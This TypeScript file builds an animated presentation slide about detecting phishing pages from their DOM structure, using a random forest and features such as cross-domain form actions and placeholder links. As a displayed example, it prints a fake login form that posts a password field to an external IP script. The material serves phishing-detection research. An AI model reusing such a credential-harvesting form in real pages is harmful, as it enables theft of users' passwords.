import { gsap } from "gsap";
import { SceneInstance } from "./types";

export function createScene10(): SceneInstance {
  const el = document.createElement("section");
  el.className = "scene-stage scene-light";
  el.id = "scene-html-features";

  let activeTimeline: gsap.core.Timeline | null = null;

  el.innerHTML = `
    <header class="scene-header">
      <span class="scene-index">10</span>
      <span class="scene-category">10 · STRUCTURAL MODELING · DOM TOPOGRAPHY</span>
    </header>

    <div class="scene-content" style="display: flex; flex-direction: column; justify-content: space-between;">
      <div>
        <span class="meta-label" style="color: var(--c-slate);">24 DOM Heuristics · 94.42% Accuracy</span>
        <h2 style="margin-top: 6px;">DOM Structural Topography</h2>
        <p class="lead subtle-text" style="max-width: 900px; margin-top: 8px; font-size: 21px;">
          Attack kits routinely clone CSS styling, but cannot replicate authentic site architecture: link density, valid navigation trees, and internal origin endpoints.
        </p>
      </div>

      <!-- Interactive DOM Scanner Layout -->
      <div style="flex: 1; display: grid; grid-template-columns: 1.2fr 1fr; gap: 32px; align-items: center; padding: 18px 0;">
        <!-- Left: Miniature Serialized DOM Tree -->
        <div style="background: #FFFFFF; border: var(--stroke-hairline) solid rgba(42, 41, 38, 0.2); padding: 20px; font-family: var(--font-mono); font-size: 13px; line-height: 1.6; position: relative; overflow: hidden; border-radius: 4px;">
          <!-- Scanner Bar -->
          <div id="dom-scanner-bar" style="position: absolute; left: 0; right: 0; top: 0; height: 3px; background: var(--c-oxide); opacity: 0.8; z-index: 10;"></div>

          <div style="color: #888;">&lt;!DOCTYPE html&gt;</div>
          <div style="color: #888;">&lt;html lang="en"&gt;</div>
          <div style="padding-left: 16px; color: #888;">&lt;head&gt;</div>
          <div style="padding-left: 32px; color: #555;">&lt;title&gt;Sign In - Verification Required&lt;/title&gt;</div>
          <div style="padding-left: 16px; color: #888;">&lt;/head&gt;</div>
          <div style="padding-left: 16px; color: #888;">&lt;body&gt;</div>
          
          <!-- Target Tag 1: Form -->
          <div id="dom-tag-form" style="padding-left: 32px; background: rgba(140, 63, 50, 0.08); border-left: 3px solid var(--c-oxide); padding-top: 4px; padding-bottom: 4px;">
            <span style="color: var(--c-oxide); font-weight: 600;">&lt;form action="http://198.51.100.24/c.php" method="POST"&gt;</span>
          </div>

          <!-- Target Tag 2: Input -->
          <div id="dom-tag-input" style="padding-left: 48px; background: rgba(140, 63, 50, 0.08); border-left: 3px solid var(--c-oxide); padding-top: 4px; padding-bottom: 4px;">
            <span style="color: var(--c-oxide); font-weight: 600;">&lt;input type="password" name="passwd" required /&gt;</span>
          </div>

          <div style="padding-left: 48px; color: #555;">&lt;button type="submit"&gt;Authenticate&lt;/button&gt;</div>
          <div style="padding-left: 32px; color: #888;">&lt;/form&gt;</div>

          <!-- Target Tag 3: Anchors -->
          <div id="dom-tag-anchors" style="padding-left: 32px; padding-top: 4px; padding-bottom: 4px;">
            <div style="color: #666;">&lt;footer&gt;</div>
            <div style="padding-left: 16px; color: var(--c-stone);">&lt;a href="#"&gt;Terms&lt;/a&gt; &lt;a href="#"&gt;Privacy&lt;/a&gt; &lt;a href="#"&gt;Help&lt;/a&gt;</div>
            <div style="color: #666;">&lt;/footer&gt;</div>
          </div>

          <div style="padding-left: 16px; color: #888;">&lt;/body&gt;</div>
          <div style="color: #888;">&lt;/html&gt;</div>
        </div>

        <!-- Right: 4 Top SHAP Informative Structural Features -->
        <div style="display: flex; flex-direction: column; gap: 12px;">
          <div class="font-mono" style="font-size: 12px; color: var(--c-stone); text-transform: uppercase;">
            Top Features (Ranked by TreeSHAP)
          </div>

          <!-- Feature 1 -->
          <div class="feature-box" style="background: #F4EFE6; border: var(--stroke-hairline) solid rgba(42, 41, 38, 0.2); padding: 14px; border-left: 4px solid var(--c-oxide); border-radius: 3px;">
            <div style="display: flex; justify-content: space-between; align-items: baseline;">
              <span class="font-mono" style="font-size: 13px; font-weight: 600; color: var(--c-ink);">external_action_ratio</span>
              <span class="font-mono tabular-nums" style="font-size: 13px; font-weight: 700; color: var(--c-oxide);">1.00 (Cross-Domain)</span>
            </div>
            <p style="font-size: 12px; color: var(--c-graphite); margin: 4px 0 0 0;">
              Form data sent to an IP or foreign domain rather than origin host.
            </p>
          </div>

          <!-- Feature 2 -->
          <div class="feature-box" style="background: #F4EFE6; border: var(--stroke-hairline) solid rgba(42, 41, 38, 0.2); padding: 14px; border-left: 4px solid var(--c-slate); border-radius: 3px;">
            <div style="display: flex; justify-content: space-between; align-items: baseline;">
              <span class="font-mono" style="font-size: 13px; font-weight: 600; color: var(--c-ink);">total_link_count</span>
              <span class="font-mono tabular-nums" style="font-size: 13px; font-weight: 700; color: var(--c-ink);">3 (Normal: &gt; 80)</span>
            </div>
            <p style="font-size: 12px; color: var(--c-graphite); margin: 4px 0 0 0;">
              Phishing kits omit navigational menus, resulting in unnaturally sparse tag trees.
            </p>
          </div>

          <!-- Feature 3 -->
          <div class="feature-box" style="background: #F4EFE6; border: var(--stroke-hairline) solid rgba(42, 41, 38, 0.2); padding: 14px; border-left: 4px solid var(--c-oxide); border-radius: 3px;">
            <div style="display: flex; justify-content: space-between; align-items: baseline;">
              <span class="font-mono" style="font-size: 13px; font-weight: 600; color: var(--c-ink);">null_anchor_ratio</span>
              <span class="font-mono tabular-nums" style="font-size: 13px; font-weight: 700; color: var(--c-oxide);">100% href="#"</span>
            </div>
            <p style="font-size: 12px; color: var(--c-graphite); margin: 4px 0 0 0;">
              Buttons and links are non-functional placeholders designed purely for visual imitation.
            </p>
          </div>

          <!-- Feature 4 -->
          <div class="feature-box" style="background: #F4EFE6; border: var(--stroke-hairline) solid rgba(42, 41, 38, 0.2); padding: 14px; border-left: 4px solid var(--c-moss); border-radius: 3px;">
            <div style="display: flex; justify-content: space-between; align-items: baseline;">
              <span class="font-mono" style="font-size: 13px; font-weight: 600; color: var(--c-ink);">has_password_input</span>
              <span class="font-mono tabular-nums" style="font-size: 13px; font-weight: 700; color: var(--c-moss);">1 (True)</span>
            </div>
            <p style="font-size: 12px; color: var(--c-graphite); margin: 4px 0 0 0;">
              Presence of a credential capture element accelerates triage when combined with external actions.
            </p>
          </div>
        </div>
      </div>

      <!-- Bottom Footer -->
      <div style="border-top: 1px solid rgba(42, 41, 38, 0.15); padding-top: 14px; display: flex; justify-content: space-between; align-items: baseline;">
        <div style="font-size: 15px; color: var(--c-graphite);">
          <strong style="color: var(--c-ink);">PERFORMANCE:</strong>
          DOM Random Forest reaches 94.42% accuracy and 0.9854 ROC-AUC standalone across 2,760 held-out test sites.
        </div>
        <div class="font-mono" style="font-size: 13px; color: var(--c-stone);">
          SPACE / ARROW → ADVANCE SUBSTEP
        </div>
      </div>
    </div>
  `;

  return {
    index: 10,
    id: "scene-html-features",
    element: el,

    enter(step: number) {
      activeTimeline = gsap.timeline();
      activeTimeline.from(el.querySelector(".scene-content"), {
        opacity: 0,
        y: 20,
        duration: 0.6,
        ease: "power2.out",
      });
      activeTimeline.to(el.querySelector("#dom-scanner-bar"), {
        top: "95%",
        duration: 2.0,
        repeat: -1,
        yoyo: true,
        ease: "sine.inOut",
      });
      this.stepTo?.(step);
    },

    stepTo(step: number) {
      const formTag = el.querySelector<HTMLElement>("#dom-tag-form");
      const inputTag = el.querySelector<HTMLElement>("#dom-tag-input");
      if (!formTag || !inputTag) return;

      if (step === 0) {
        gsap.to([formTag, inputTag], { backgroundColor: "rgba(140, 63, 50, 0.08)", duration: 0.3 });
      } else if (step === 1) {
        gsap.to([formTag, inputTag], { backgroundColor: "rgba(140, 63, 50, 0.25)", duration: 0.3 });
      } else if (step === 2) {
        gsap.fromTo(
          el.querySelectorAll(".feature-box"),
          { scale: 0.97 },
          { scale: 1, stagger: 0.08, duration: 0.3, ease: "back.out(2)" }
        );
      }
    },

    leave() {
      if (activeTimeline) {
        activeTimeline.kill();
        activeTimeline = null;
      }
    },
  };
}
